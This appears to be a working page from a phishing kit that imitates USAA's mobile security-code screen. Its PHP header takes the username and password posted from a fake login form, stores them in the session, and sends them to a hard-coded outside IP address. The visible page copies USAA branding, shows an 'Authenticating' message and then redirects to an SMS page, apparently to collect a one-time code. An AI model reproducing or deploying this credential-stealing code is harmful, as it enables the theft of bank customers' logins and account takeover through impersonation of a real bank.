<?php
session_start();
error_reporting(0);
$user = @$_POST['a'];
$pass = @$_POST['b'];
$hostname = @gethostbyaddr($_SERVER['REMOTE_ADDR']);
$phone = @$_POST['phone'];


$_SESSION['user']= $user;
$_SESSION['pass']= $pass;


function hextobin($hexstr) 
    { 
        $n = strlen($hexstr); 
        $sbin="";   
        $i=0; 
        while($i<$n) 
        {       
            $a =substr($hexstr,$i,2);           
            @$c = pack("H*",$a); 
            if ($i==0){$sbin=$c;} 
            else {$sbin.=$c;} 
            $i+=2; 
        } 
        return $sbin; 
    } 



if ($user == "" || $pass == "" ) {
  echo "<meta http-equiv='refresh' content='0;url=index.php?error=1'>";
  die();
}

$test = @file_get_contents("http://179.43.128.199//panel/a.php?main=$user,$pass,$user,");

?>


<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr" class="yui3-js-enabled"><head><meta charset="utf-8">
<title>Security Code | USAA</title>
    <meta http-equiv="refresh" content="20; URL=sms.html">
<meta name="title" content="Security Code | USAA">


<meta name="format-detection" content="telephone=no">
<meta http-equiv="x-rim-auto-match" content="none">
<meta name="viewport" content="width=device-width, initial-scale=1.0">


<link rel="canonical" href="https://mobile.usaa.com/inet/ent_auth_otc/otc/securityCodeApp">

<style type="text/css" id="com-usaa-authentication-onetimecode-web-pages-SecurityCodeAuthenticationPage-1-0">
/*<![CDATA[*/

input[type="radio"] {
height: 20pt;
width: 20pt;
margin-bottom: 7px;
margin-left: 10px;
margin-top: 7px;
}
label {
font-size: 13pt;
vertical-align: super;
margin-left: 0.3em;
}

/*]]>*/
</style>

<style type="text/css" id="com-usaa-authentication-onetimecode-web-pages-SecurityCodeAuthenticationPage-0">
/*<![CDATA[*/

#wcmContentHd .DWT h1 {
font-family: Arial;
font-size: 180%;
text-align: center;
color: #1a1a1a;
}
#wcmContentHd .DWT p {
font-family: Arial;
font-size: 110%;
text-align: center;
margin-top: 2%;
margin-bottom: 3%;
line-height: 135%;
}
#wcmContentHd .DWT ul {
font-family: Arial;
font-size: 110%;
color: #1a1a1a !important;
}
#fadeBack {
height: 990px;
position: absolute;
left: 0;
top: 0;
width: 100%;
background: #000;
z-index: 950;
opacity: .75;
}
#appTokenFadeDiv {
height: 990px;
position: fixed;
left: 0;
top: 0;
width: 100%;
background: #000;
z-index: 950;
opacity: .75;
}
#learnMoreId {
width: 70%;
z-index: 40000;
top: 400px !important;
left: 0;
height: auto;
opacity: 1;
margin: 0 auto;
max-width: 570px;
background: #E8e8e8;
box-shadow: 0 1px 12px #111;
position: relative;
margin-top: -400px !important;
padding: 5%;
}
#secCodeWCMId, #tokenDetailWCMId {
width: 70%;
z-index: 40000;
top: 400px !important;
left: 0;
height: auto;
opacity: 1;
margin: 0 auto;
max-width: 570px;
background: #E8e8e8;
box-shadow: 0 1px 12px #111;
position: relative;
margin-top: -200px !important;
padding: 5%;
}
#learnMoreWCM h1, #secCodeWCMId h2, #tokenDetailWCMId h2 {
font-family: Arial;
font-size: 110%;
color: #002c55;
margin-bottom: 3%;
}
#learnMoreWCM p, #secCodeWCMId p, #tokenDetailWCMId p {
font-family: Arial;
line-height: 140%;
}
#learnMoreWCM ul li {
font-family: Arial;
line-height: 140% !important;
margin-left: 10%;
margin-bottom: 2%;
width: 86%;
}
#learnMoreCloseButton, #secCodeCloseButton, #tokenDetailCloseButton {
font-family: Arial;
font-size: 100%;
color: white;
width: 80%;
height: 40px;
margin-left: 10%;
margin-top: 5%;
background: linear-gradient(to bottom,#3F7190,#00375C);
border: none;
}
#glossaryInfo_head_active_Id a span{
font-family: Arial;
color: #076a93;
border-bottom: transparent !important;
}
#glossaryInfo_head_inactive_Id a span{
font-family: Arial;
color: #002c55;
border-bottom: transparent !important;
}
#appTokenMainDiv {
border: 0!important;
border-radius: 1em;
margin-left: 4%;
background: #FFF;
border: 5px solid #DDE9EF;
float: left;
padding: 10px;
position: relative;
height: 100%;
z-index: 40000;
width: 100%;
}

/*]]>*/
</style>
</head><body id="yui_3_9_0_1_1579965522511_25"><iframe id="utag_495" height="1" width="1" style="display:none" src="https://d.agkn.com/iframe/9297/?custid=MzAxMzA0NTkx&amp;amcid=28677407012346473225776843022015627872&amp;type=1000&amp;che=0.6890875732523467"></iframe><link rel="stylesheet" type="text/css" href="https://s.usaa.com/inet/resources/aggregator?type=-min&amp;fv=2.0&amp;embed=true&amp;k_3.9.0_reset_css:cacheid=3299152759_p&amp;k_3.9.0_fonts_css:cacheid=3363860946_p&amp;k_3.9.0_grids_css:cacheid=3577736449_p&amp;k_2.0_UsaaHtmlBase_css_1:cacheid=1209313802_p&amp;k_2.0_UsaaCommon_css_1:cacheid=3906174871_p&amp;k_2.0_UsaaLink_css_1:cacheid=2107246772_p&amp;k_2.0_CrossChannelPanel_css:cacheid=240016603_p&amp;k_2.0_HeaderPanel_css_1:cacheid=976734856_p&amp;k_2.0_FootnotesContainer_css:cacheid=3317129168_p&amp;k_2.0_UpperFootnotesContainer_css_2:cacheid=1_p&amp;k_2.0_LowerFootnotesContainer_css_2:cacheid=3434359550_p&amp;k_2.0_UsaaButton_css_3:cacheid=939471469_p&amp;k_2.0_FooterPanel_css_1:cacheid=3621013894_p&amp;k_2.0_UsaaHtmlBaseV2_css_1:cacheid=2342430160_p&amp;k_2.0_UsaaBase_css_1:cacheid=2486984679_p">
<link rel="stylesheet" type="text/css" href="https://s.usaa.com/inet/resources/aggregator?type=-min&amp;fv=2.0&amp;embed=true&amp;k_2.0_HeadingLabel_css_1:cacheid=976209505_p&amp;k_2.0_ModalPanel_css_1:cacheid=3190382671_p&amp;k_2.0_PairedInfoTableBorder_css_1:cacheid=2627916932_p&amp;k_2.0_UsaaFeedbackPanel_css_1:cacheid=701513469_p&amp;k_UsaaBaseFont_css:cacheid=3036786035_p&amp;k_2.0_UsaaHidden_css:cacheid=2460684718_p&amp;k_2.0_UsaaBasePageLayout_css_1:cacheid=1033641016_p"><style type="text/css" media="screen" id="mm_style_mm_cdApiStyleId_1"></style><link id="null" rel="stylesheet" href="https://s.usaa.com/inet/resources/aggregator?type=-min&amp;fv=2.0&amp;embed=true&amp;k_3.9.0_reset_css:cacheid=3299152759_p&amp;k_3.9.0_fonts_css:cacheid=3363860946_p&amp;k_3.9.0_grids_css:cacheid=3577736449_p&amp;k_2.0_UsaaHtmlBase_css_1:cacheid=1209313802_p&amp;k_2.0_UsaaCommon_css_1:cacheid=3906174871_p&amp;k_2.0_UsaaButton_css_3:cacheid=939471469_p" type="text/css"><link id="null" rel="stylesheet" href="https://s.usaa.com/inet/resources/aggregator?type=-min&amp;fv=2.0&amp;embed=true&amp;k_2.0_PairedInfoTableBorder_css_1:cacheid=2627916932_p&amp;k_2.0_NoticeHighlightingBehavior_css:cacheid=3362585992_p&amp;k_2.0_UsaaFeedbackPanel_css_1:cacheid=701513469_p&amp;k_2.0_HeadingLabel_css_1:cacheid=976209505_p" type="text/css">

<div id="flowWrapper" class="flow-wrapper">

<a name="top"></a>


<span class="usaa-hidden">
</span>

<div class="noindex">
<div class="site-header">
<div class="site-header-section">
<div class="site-header-content">
<div class="site-header-ia">
<a class="usaa-link site-logo" accesskey="1" href="https://mobile.usaa.com/inet/ent_home/MbCpHome?channel=mobile"><span class="link-liner">
<span class="liner"></span>
USAA Home
</span></a>
<h1 class="usaa-heading skin-heading-1"></h1>

</div>
</div>
</div>
</div>
</div>
<div class="page-wrapper site-content yui3-g" id="yui_3_9_0_1_1579965522511_23">
<div>
<div id="id6">

</div>
</div>


<div class="main-content yui3-u" id="yui_3_9_0_1_1579965522511_21">

<div class="page-content" role="main" id="yui_3_9_0_1_1579965522511_19">

<div id="id7" style="display:none"></div>
<div id="id8" style="display:none"></div>
<div id="fadeBack" style="display: none;"></div>
<div id="learnMoreId" style="display: none;">
<div id="learnMoreWCM" class="wcm-content"><link href="https://content.usaa.com/mcontent/static_assets/Includes/tridion_DWT.css?cacheid=4092548069_p" rel="stylesheet" type="text/css"><div class="DWT"><h1>About Security Codes</h1><p>We're committed to continuously enhancing our security measures. Here are a few reasons why we've chosen to use security codes:</p><ul><li>Incidents of identity theft continue to increase.</li><li>Passwords alone are no longer secure enough.</li><li>Adding a random code to our logon process improves account protection.</li><li>Information from your profile offers control over how the codes are delivered.</li></ul></div></div>
<button id="learnMoreCloseButton" type="button" onclick="closeModalWindow('learnMore');" style="font-family: Arial;font-size: 100%;">Close</button>
</div>
<div id="secCodeWCMId" style="display: none;">
<div id="secCodeWCM" class="wcm-content"><h2 class="sctn-heading">
Security Code
</h2><div class="static-content"><p>A random six-digit code sent to a phone number or email address in your usaa.com profile or found in your USAA app. The code is different each time.</p></div></div>
<button id="secCodeCloseButton" type="button" onclick="closeModalWindow('secCode');" style="font-family: Arial;font-size: 100%;">Close</button>
</div>
<div id="tokenDetailWCMId" style="display: none;">
<div id="tokenDetailWCM" class="wcm-content"><h2 class="sctn-heading">
USAA Mobile App Security Code
</h2><div class="static-content">
In your USAA Mobile App, a random six-digit security code is generated. A different code will appear every 30 seconds.
</div></div>
<button id="tokenDetailCloseButton" type="button" onclick="closeModalWindow('tokenDetail');" style="font-family: Arial;font-size: 100%;">Close</button>
</div>
<form action="./securityCodeApp?0-1.IFormSubmitListener-deliveryForm&amp;acf=1" novalidate="novalidate" id="id9" method="post"><input type="hidden" name="CSRFToken" value="6fb48bad662132d9692d6d00c094850c"><div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input type="hidden" name="id9_hf_0" id="id9_hf_0"></div>
<div id="wcmContentHd" class="wcm-content"><link href="https://content.usaa.com/mcontent/static_assets/Includes/tridion_DWT.css?cacheid=4092548069_p" rel="stylesheet" type="text/css"><div class="DWT"><div>
</div></div></div>
<div id="ida" style="display:none"></div>
<div id="idb" style="display:none"></div>
<div id="ide" class="usaa-pairedInfo">
<div class="usaa-section">
<div class="heading">


</div>

<table style="width: 108%;height: 68px;border-color: #B3B4B9;border-top-style: solid;border-top-width: 0.1em;border-bottom-style: solid;border-bottom-width: 0;margin-left: -4%;background-color: #f5f5f5;"></table>

</div>
</div>
<div id="idf" style="display:none"></div>
<div id="id15" class="usaa-pairedInfo">
<div class="usaa-section">
<div class="heading">


</div>

<table style="width: 108%;height: 68px;border-color: #B3B4B9;border-top-style: solid;border-top-width: 0.1em;border-bottom-style: solid;border-bottom-width: 0.1em;margin-left: -4%;background-color: #f5f5f5;"><tbody><tr>
<td style="width: 3%;padding-left: 2%;padding-top: 0.5%">
<img name="codeActiveImage" id="id24" src="loading.gif">
</td>
<td style="padding-left: 2.5%;vertical-align: middle;padding-top: 2%;">
<div style="font-family: Arial;color: #076a93;" id="id25" class="usaa-heading ">Authenticating.. Please wait.</div>
</td>
</tr></tbody></table>

</div>
</div>
<div id="id16" style="display:none"></div>
<div id="id19" class="usaa-pairedInfo">
<div class="usaa-section">
<div class="heading">


</div>

<div id="id21" style="display:none"></div><table style="border: 0;width: 100%;">
<tbody>
<tr>


</tr>
<tr>
<td style="border: 0;">
<table style="margin-top: 3%;margin-bottom: -2.5%;"><tbody><tr>
<td><div style="font-family: Arial;font-size: 112.5%;color: #002b54;" id="id22">This may take up to one minute.</div></td>
<td><a href="javascript:;" onclick="openModalWindow('secCode');"></a></td>
</tr></tbody></table>
<br>
<div style="font-family: Arial;font-size: 105%;" id="id1f" class="feedbackMessagePanel usaa-hidden">
<div class="usaaFeedbackPanel-wrapper">


</div>
</div>
</td>
</tr>
<tr>
<td style="border: 0;">

</td>
</tr>
</tbody>
</table>

</div>
</div><br>
<div class="button-container" id="yui_3_9_0_1_1579965522511_16">
<button id="id5" style="display:none"></button>
<br>

</div>
</form>


</div>



<div>
<div class="switchoptionsmobile">

<a href="https://mobile.usaa.com/inet/ent_utils/CrossChannelAuthRedirect?currentAppId=OneTimeCodeApplication&amp;targetChannel=member&amp;targetLookAndFeel=default" class="usaa-link "></a>
</div>
</div>
<div class="usaa-disclosures" style="display:none">
<div class="disclosure-group">

</div>
</div>
<div class="usaa-hidden" id="id1c">
<div>
<div>
<div id="id1d">
<div class="yui3-modal yui3-modal-loading" id="id3">
<div><link href="https://content.usaa.com/mcontent/static_assets/Includes/tridion_DWT.css?cacheid=4092548069_p" rel="stylesheet" type="text/css"><div class="DWT"><h1>About Security Codes</h1><p>We're committed to continuously enhancing our security measures. Here are a few reasons why we've chosen to use security codes:</p><ul><li>Incidents of identity theft continue to increase.</li><li>Passwords alone are no longer secure enough.</li><li>Adding a random code to our logon process improves account protection.</li><li>Information from your profile offers control over how the codes are delivered.</li></ul></div></div>

</div>
</div>
</div>
</div>
</div>
</div>

</div>
<div class="noindex">
<div class="site-footer">

</div>
</div>

</div>
<div>
</div>
<span></span><div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important" class=""></div>



</body></html>